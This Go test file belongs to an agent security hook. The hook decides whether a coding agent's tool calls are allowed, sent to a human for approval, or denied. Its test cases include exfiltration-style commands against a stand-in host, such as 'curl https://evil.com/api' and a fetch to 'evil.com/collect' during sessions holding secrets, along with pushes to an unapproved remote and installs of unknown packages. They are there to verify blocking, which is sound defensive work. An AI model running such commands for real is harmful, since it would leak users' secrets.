package hooks

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/somoore/sir/pkg/core"
	"github.com/somoore/sir/pkg/lease"
	"github.com/somoore/sir/pkg/session"
)

// MockEvaluator replaces mister-core for unit tests.
// It implements the same policy logic as core.localEvaluate.
type MockEvaluator struct{}

func (m *MockEvaluator) Evaluate(req *core.Request) (*core.Response, error) {
	// Session-fatal deny-all
	if req.Session.DenyAll {
		return &core.Response{Decision: "deny", Reason: "session in deny-all mode"}, nil
	}

	// Posture file writes always ask
	if req.Intent.IsPosture && req.Intent.Verb == "stage_write" {
		return &core.Response{Decision: "ask", Reason: "write to posture file: " + req.Intent.Target}, nil
	}

	// Sensitive file reads ask
	if req.Intent.IsSensitive && req.Intent.Verb == "read_ref" {
		return &core.Response{Decision: "ask", Reason: "read sensitive file: " + req.Intent.Target}, nil
	}

	// Secret session + external egress = block
	if req.Session.SecretSession && req.Intent.Verb == "net_external" {
		return &core.Response{Decision: "deny", Reason: "session carries secret-labeled data, sink is untrusted"}, nil
	}

	// Secret session + unapproved push = block
	if req.Session.SecretSession && req.Intent.Verb == "push_remote" {
		return &core.Response{Decision: "deny", Reason: "session carries secret-labeled data, push to unapproved remote blocked"}, nil
	}

	// Secret session + approved push = ask
	if req.Session.SecretSession && req.Intent.Verb == "push_origin" {
		return &core.Response{Decision: "ask", Reason: "session carries secret-labeled data, push to approved remote requires approval"}, nil
	}

	// Ephemeral execution always asks
	if req.Intent.Verb == "run_ephemeral" {
		return &core.Response{Decision: "ask", Reason: "ephemeral remote code execution: " + req.Intent.Target}, nil
	}

	// Allowlisted network = ask
	if req.Intent.Verb == "net_allowlisted" {
		return &core.Response{Decision: "ask", Reason: "network access to approved host: " + req.Intent.Target}, nil
	}

	// MCP unapproved server = ask (matches production mapMCP → "mcp_unapproved")
	if req.Intent.Verb == "mcp_unapproved" {
		return &core.Response{Decision: "ask", Reason: "MCP server not in approved list: " + req.Intent.Target}, nil
	}

	// Push to unapproved remote = ask
	if req.Intent.Verb == "push_remote" {
		return &core.Response{Decision: "ask", Reason: "push to unapproved remote: " + req.Intent.Target}, nil
	}

	// Default: allow
	return &core.Response{Decision: "allow", Reason: "within lease boundary"}, nil
}

// evalTestCase defines a single PreToolUse evaluation scenario.
type evalTestCase struct {
	Name             string
	ToolName         string
	ToolInput        map[string]string
	SecretSession    bool
	DenyAll          bool
	ExpectedDecision string
	ExpectedReason   string // substring match (case-insensitive)
}

// buildEvalRequest constructs a core.Request from the test case using the
// production MapToolToIntent and LabelsForTarget, so the test exercises the
// same code paths as the real PreToolUse handler.
func buildEvalRequest(tc evalTestCase, l *lease.Lease) *core.Request {
	// Convert map[string]string to map[string]interface{} for production API
	input := make(map[string]interface{}, len(tc.ToolInput))
	for k, v := range tc.ToolInput {
		input[k] = v
	}

	intent := MapToolToIntent(tc.ToolName, input, l)

	var labels []core.Label
	if intent.Verb == "read_ref" || intent.Verb == "stage_write" {
		lbl := LabelsForTarget(intent.Target, l)
		labels = []core.Label{lbl}
	} else {
		labels = []core.Label{{Sensitivity: "public", Trust: "trusted", Provenance: "user"}}
	}

	return &core.Request{
		ToolName: tc.ToolName,
		Intent: core.Intent{
			Verb:         intent.Verb,
			Target:       intent.Target,
			Labels:       labels,
			IsPosture:    intent.IsPosture,
			IsSensitive:  intent.IsSensitive,
			IsDelegation: tc.ToolName == "Agent",
		},
		Session: core.SessionInfo{
			SecretSession: tc.SecretSession,
			DenyAll:       tc.DenyAll,
		},
	}
}

func TestPreToolUseEvaluation(t *testing.T) {
	l := lease.DefaultLease()
	eval := &MockEvaluator{}
	_ = &session.State{} // ensure session package compiles

	tests := []evalTestCase{
		// --- File reads ---
		{
			Name:             "read .env is ask (sensitive)",
			ToolName:         "Read",
			ToolInput:        map[string]string{"file_path": ".env"},
			ExpectedDecision: "ask",
			ExpectedReason:   "sensitive",
		},
		{
			Name:             "read .env.example is allow (excluded)",
			ToolName:         "Read",
			ToolInput:        map[string]string{"file_path": ".env.example"},
			ExpectedDecision: "allow",
		},
		{
			Name:             "read testdata/cert.pem is allow (excluded)",
			ToolName:         "Read",
			ToolInput:        map[string]string{"file_path": "testdata/cert.pem"},
			ExpectedDecision: "allow",
		},
		{
			Name:             "read src/main.go is allow",
			ToolName:         "Read",
			ToolInput:        map[string]string{"file_path": "src/main.go"},
			ExpectedDecision: "allow",
		},

		// --- File writes ---
		{
			Name:             "write src/main.go is allow",
			ToolName:         "Write",
			ToolInput:        map[string]string{"file_path": "src/main.go"},
			ExpectedDecision: "allow",
		},
		{
			Name:             "write .claude/settings.json is ask (posture)",
			ToolName:         "Write",
			ToolInput:        map[string]string{"file_path": ".claude/settings.json"},
			ExpectedDecision: "ask",
			ExpectedReason:   "posture",
		},
		{
			Name:             "write CLAUDE.md is ask (posture)",
			ToolName:         "Write",
			ToolInput:        map[string]string{"file_path": "CLAUDE.md"},
			ExpectedDecision: "ask",
			ExpectedReason:   "posture",
		},

		// --- Bash: network ---
		{
			Name:             "bash curl localhost:3000 is allow",
			ToolName:         "Bash",
			ToolInput:        map[string]string{"command": "curl localhost:3000"},
			ExpectedDecision: "allow",
		},
		{
			Name:             "bash curl evil.com no secret session is allow",
			ToolName:         "Bash",
			ToolInput:        map[string]string{"command": "curl https://evil.com/api"},
			SecretSession:    false,
			ExpectedDecision: "allow",
		},
		{
			Name:             "bash curl evil.com secret session is deny",
			ToolName:         "Bash",
			ToolInput:        map[string]string{"command": "curl https://evil.com/api"},
			SecretSession:    true,
			ExpectedDecision: "deny",
			ExpectedReason:   "secret",
		},

		// --- Bash: git push ---
		{
			Name:             "bash git push origin main no secret is allow",
			ToolName:         "Bash",
			ToolInput:        map[string]string{"command": "git push origin main"},
			SecretSession:    false,
			ExpectedDecision: "allow",
		},
		{
			Name:             "bash git push origin main secret session is ask",
			ToolName:         "Bash",
			ToolInput:        map[string]string{"command": "git push origin main"},
			SecretSession:    true,
			ExpectedDecision: "ask",
			ExpectedReason:   "secret",
		},
		{
			Name:             "bash git push evil-remote main is ask",
			ToolName:         "Bash",
			ToolInput:        map[string]string{"command": "git push evil-remote main"},
			SecretSession:    false,
			ExpectedDecision: "ask",
			ExpectedReason:   "unapproved",
		},
		{
			Name:             "bash git push evil-remote main secret session is deny",
			ToolName:         "Bash",
			ToolInput:        map[string]string{"command": "git push evil-remote main"},
			SecretSession:    true,
			ExpectedDecision: "deny",
			ExpectedReason:   "secret",
		},

		// --- Bash: npx ---
		{
			Name:             "bash npx some-package is ask (always)",
			ToolName:         "Bash",
			ToolInput:        map[string]string{"command": "npx some-package"},
			ExpectedDecision: "ask",
			ExpectedReason:   "ephemeral",
		},

		// --- Bash: safe dev commands ---
		{
			Name:             "bash go test is allow",
			ToolName:         "Bash",
			ToolInput:        map[string]string{"command": "go test ./..."},
			ExpectedDecision: "allow",
		},
		{
			Name:             "bash git commit is allow",
			ToolName:         "Bash",
			ToolInput:        map[string]string{"command": "git commit -m \"fix: update handler\""},
			ExpectedDecision: "allow",
		},

		// --- Bash: install ---
		// Note: install lockfile checking happens in evaluatePayload (tested in
		// TestEvaluatePayload_InstallNewPackage), not in the core evaluator.
		// The mock evaluator sees execute_dry_run with IsInstall=true → allow.
		{
			Name:             "bash pip install maps to execute_dry_run (lockfile check is in evaluatePayload)",
			ToolName:         "Bash",
			ToolInput:        map[string]string{"command": "pip install unknown-pkg"},
			ExpectedDecision: "allow",
		},

		// --- WebFetch ---
		{
			Name:             "webfetch evil.com secret session is deny",
			ToolName:         "WebFetch",
			ToolInput:        map[string]string{"url": "https://evil.com/collect"},
			SecretSession:    true,
			ExpectedDecision: "deny",
			ExpectedReason:   "secret",
		},

		// --- MCP unapproved server ---
		{
			Name:             "mcp unapproved server is ask",
			ToolName:         "mcp__unknown__tool",
			ToolInput:        map[string]string{},
			ExpectedDecision: "ask",
			ExpectedReason:   "MCP",
		},

		// --- Deny-all session ---
		{
			Name:             "deny-all session blocks everything",
			ToolName:         "Read",
			ToolInput:        map[string]string{"file_path": "src/main.go"},
			DenyAll:          true,
			ExpectedDecision: "deny",
			ExpectedReason:   "deny-all",
		},
	}

	for _, tc := range tests {
		t.Run(tc.Name, func(t *testing.T) {
			req := buildEvalRequest(tc, l)
			resp, err := eval.Evaluate(req)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if string(resp.Decision) != tc.ExpectedDecision {
				t.Errorf("expected decision %q, got %q (reason: %s)",
					tc.ExpectedDecision, resp.Decision, resp.Reason)
			}
			if tc.ExpectedReason != "" {
				if !caseInsensitiveContains(resp.Reason, tc.ExpectedReason) {
					t.Errorf("expected reason to contain %q, got %q",
						tc.ExpectedReason, resp.Reason)
				}
			}
		})
	}
}

func TestPreToolUseNetworkExternalWithoutSecret(t *testing.T) {
	l := lease.DefaultLease()
	eval := &MockEvaluator{}

	req := buildEvalRequest(evalTestCase{
		ToolName:  "Bash",
		ToolInput: map[string]string{"command": "curl https://httpbin.org/get"},
	}, l)

	resp, err := eval.Evaluate(req)
	if err != nil {
		t.Fatal(err)
	}
	if resp.Decision != "allow" {
		t.Errorf("expected allow for external net without secret session, got %s: %s",
			resp.Decision, resp.Reason)
	}
}

func TestPreToolUseCurlLocalhostWithSecretSession(t *testing.T) {
	l := lease.DefaultLease()
	eval := &MockEvaluator{}

	req := buildEvalRequest(evalTestCase{
		ToolName:      "Bash",
		ToolInput:     map[string]string{"command": "curl localhost:8080/api/health"},
		SecretSession: true,
	}, l)

	resp, err := eval.Evaluate(req)
	if err != nil {
		t.Fatal(err)
	}
	if resp.Decision != "allow" {
		t.Errorf("expected allow for curl localhost with secret session, got %s: %s",
			resp.Decision, resp.Reason)
	}
}

// caseInsensitiveContains checks if s contains sub (case-insensitive).
func caseInsensitiveContains(s, sub string) bool {
	sLower := toLower(s)
	subLower := toLower(sub)
	return strContains(sLower, subLower)
}

func toLower(s string) string {
	b := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c >= 'A' && c <= 'Z' {
			c += 32
		}
		b[i] = c
	}
	return string(b)
}

func strContains(s, sub string) bool {
	if len(sub) > len(s) {
		return false
	}
	for i := 0; i <= len(s)-len(sub); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}

// --- Tests for evaluatePayload (the testable core of the PreToolUse handler) ---

// newTestSession creates a minimal session state for testing.
// LeaseHash is empty so VerifyLeaseIntegrity always returns true.
// Calls Save() to populate SessionHash (required by VerifySessionIntegrity).
func newTestSession(t *testing.T, projectRoot string) *session.State {
	t.Helper()
	stateDir := session.StateDir(projectRoot)
	if err := os.MkdirAll(stateDir, 0o700); err != nil {
		t.Fatalf("create state dir: %v", err)
	}
	state := session.NewState(projectRoot)
	if err := state.Save(); err != nil {
		t.Fatalf("save initial session: %v", err)
	}
	return state
}

func TestEvaluatePayload_InstallNewPackage(t *testing.T) {
	// A project with package-lock.json that does NOT contain "evil-pkg"
	projectRoot := t.TempDir()
	l := lease.DefaultLease()
	state := newTestSession(t, projectRoot)

	// Create a package-lock.json that has express but not evil-pkg
	lockContent := `{"lockfileVersion":3,"packages":{"node_modules/express":{"version":"4.18.2"}}}`
	if err := os.WriteFile(filepath.Join(projectRoot, "package-lock.json"), []byte(lockContent), 0o644); err != nil {
		t.Fatal(err)
	}

	payload := &HookPayload{
		ToolName:  "Bash",
		ToolInput: map[string]interface{}{"command": "npm install evil-pkg"},
		CWD:       projectRoot,
	}

	resp, err := evaluatePayload(payload, l, state, projectRoot)
	if err != nil {
		t.Fatalf("evaluatePayload: %v", err)
	}
	if resp.Decision != "ask" {
		t.Errorf("npm install unlocked package: expected ask, got %s (reason: %s)", resp.Decision, resp.Reason)
	}
}

func TestEvaluatePayload_ApprovedMCPGatePreservesSessionIntegrity(t *testing.T) {
	projectRoot := t.TempDir()
	l := lease.DefaultLease()
	l.ApprovedMCPServers = []string{"jira"}
	state := newTestSession(t, projectRoot)
	state.MarkSecretSession()
	if err := state.Save(); err != nil {
		t.Fatalf("save secret session: %v", err)
	}

	firstResp, err := ExportEvaluatePayload(&HookPayload{
		ToolName:  "mcp__jira__create_issue",
		ToolInput: map[string]interface{}{"summary": "publish report"},
	}, l, state, projectRoot)
	if err != nil {
		t.Fatalf("evaluate approved MCP gate: %v", err)
	}
	if got := string(firstResp.Decision); got != "ask" {
		t.Fatalf("approved MCP gate decision = %q, want ask (reason=%s)", got, firstResp.Reason)
	}
	if !session.VerifySessionIntegrity(state) {
		t.Fatal("approved MCP gate should persist the updated session hash")
	}

	secondResp, err := ExportEvaluatePayload(&HookPayload{
		ToolName:  "mcp__rogue__create_issue",
		ToolInput: map[string]interface{}{"summary": "publish report"},
	}, l, state, projectRoot)
	if err != nil {
		t.Fatalf("evaluate follow-up unapproved MCP call: %v", err)
	}
	if got := string(secondResp.Decision); got != "ask" {
		t.Fatalf("follow-up unapproved MCP decision = %q, want ask (reason=%s)", got, secondResp.Reason)
	}
}

func TestEvaluatePayload_InstallKnownPackage(t *testing.T) {
	// A project with package-lock.json that CONTAINS "express"
	projectRoot := t.TempDir()
	l := lease.DefaultLease()
	state := newTestSession(t, projectRoot)

	lockContent := `{"lockfileVersion":3,"packages":{"node_modules/express":{"version":"4.18.2"}},"dependencies":{"express":{"version":"4.18.2"}}}`
	if err := os.WriteFile(filepath.Join(projectRoot, "package-lock.json"), []byte(lockContent), 0o644); err != nil {
		t.Fatal(err)
	}

	payload := &HookPayload{
		ToolName:  "Bash",
		ToolInput: map[string]interface{}{"command": "npm install express"},
		CWD:       projectRoot,
	}

	resp, err := evaluatePayload(payload, l, state, projectRoot)
	if err != nil {
		t.Fatalf("evaluatePayload: %v", err)
	}
	if resp.Decision != "allow" {
		t.Errorf("npm install known package: expected allow, got %s (reason: %s)", resp.Decision, resp.Reason)
	}
}

func TestEvaluatePayload_GreenfieldInstall(t *testing.T) {
	// No lockfile at all — greenfield project; should allow
	projectRoot := t.TempDir()
	l := lease.DefaultLease()
	state := newTestSession(t, projectRoot)

	payload := &HookPayload{
		ToolName:  "Bash",
		ToolInput: map[string]interface{}{"command": "npm install express"},
		CWD:       projectRoot,
	}

	resp, err := evaluatePayload(payload, l, state, projectRoot)
	if err != nil {
		t.Fatalf("evaluatePayload: %v", err)
	}
	if resp.Decision != "allow" {
		t.Errorf("greenfield install: expected allow (no lockfile), got %s (reason: %s)", resp.Decision, resp.Reason)
	}
}

func TestEvaluatePayload_DenyAllSession(t *testing.T) {
	projectRoot := t.TempDir()
	l := lease.DefaultLease()
	state := newTestSession(t, projectRoot)
	state.SetDenyAll("test: posture tamper detected")

	payload := &HookPayload{
		ToolName:  "Read",
		ToolInput: map[string]interface{}{"file_path": "src/main.go"},
		CWD:       projectRoot,
	}

	resp, err := evaluatePayload(payload, l, state, projectRoot)
	if err != nil {
		t.Fatalf("evaluatePayload: %v", err)
	}
	if resp.Decision != "deny" {
		t.Errorf("deny-all session: expected deny, got %s", resp.Decision)
	}
}

func TestEvaluatePayload_PostureWriteAsks(t *testing.T) {
	projectRoot := t.TempDir()
	l := lease.DefaultLease()
	state := newTestSession(t, projectRoot)

	payload := &HookPayload{
		ToolName:  "Write",
		ToolInput: map[string]interface{}{"file_path": ".claude/settings.json"},
		CWD:       projectRoot,
	}

	resp, err := evaluatePayload(payload, l, state, projectRoot)
	if err != nil {
		t.Fatalf("evaluatePayload: %v", err)
	}
	if resp.Decision != "ask" {
		t.Errorf("posture write: expected ask, got %s (reason: %s)", resp.Decision, resp.Reason)
	}
}

func TestEvaluatePayload_NormalRead(t *testing.T) {
	projectRoot := t.TempDir()
	l := lease.DefaultLease()
	state := newTestSession(t, projectRoot)

	payload := &HookPayload{
		ToolName:  "Read",
		ToolInput: map[string]interface{}{"file_path": "src/main.go"},
		CWD:       projectRoot,
	}

	resp, err := evaluatePayload(payload, l, state, projectRoot)
	if err != nil {
		t.Fatalf("evaluatePayload: %v", err)
	}
	if resp.Decision != "allow" {
		t.Errorf("normal read: expected allow, got %s (reason: %s)", resp.Decision, resp.Reason)
	}
}

// --- Shared test helpers (used by labels_test.go) ---

// LabelsForPath returns IFC labels for a given path (simplified for test assertions).
func LabelsForPath(path string, l *lease.Lease) []core.Label {
	if IsSensitivePath(path, l) {
		return []core.Label{{Sensitivity: "secret", Trust: "trusted", Provenance: "user"}}
	}
	return []core.Label{{Sensitivity: "internal", Trust: "trusted", Provenance: "user"}}
}

// MatchGlob provides simplified glob matching for the test harness.
func MatchGlob(pattern, name string) bool {
	if pattern == name {
		return true
	}
	if len(pattern) > 3 && pattern[len(pattern)-3:] == "/**" {
		prefix := pattern[:len(pattern)-3]
		if len(name) > len(prefix) && name[:len(prefix)] == prefix && name[len(prefix)] == '/' {
			return true
		}
	}
	if len(pattern) > 1 && pattern[0] == '*' && pattern[1] == '.' {
		ext := pattern[1:]
		if len(name) >= len(ext) && name[len(name)-len(ext):] == ext {
			return true
		}
	}
	if len(pattern) > 2 && pattern[len(pattern)-2:] == "/*" {
		dir := pattern[:len(pattern)-2]
		if len(name) > len(dir) && name[:len(dir)] == dir && name[len(dir)] == '/' {
			return true
		}
	}
	if idx := indexOfStr(pattern, "/**/"); idx >= 0 {
		prefix := pattern[:idx]
		suffix := pattern[idx+4:]
		if len(name) > len(prefix) && name[:len(prefix)] == prefix {
			if len(suffix) > 0 && suffix[0] == '*' {
				ext := suffix[1:]
				if len(name) >= len(ext) && name[len(name)-len(ext):] == ext {
					return true
				}
			}
		}
	}
	if len(pattern) > 2 && pattern[len(pattern)-2:] == ".*" {
		base := pattern[:len(pattern)-2]
		if len(name) > len(base) && name[:len(base)] == base && name[len(base)] == '.' {
			return true
		}
	}
	return false
}

func indexOfStr(s, sub string) int {
	for i := 0; i <= len(s)-len(sub); i++ {
		if s[i:i+len(sub)] == sub {
			return i
		}
	}
	return -1
}
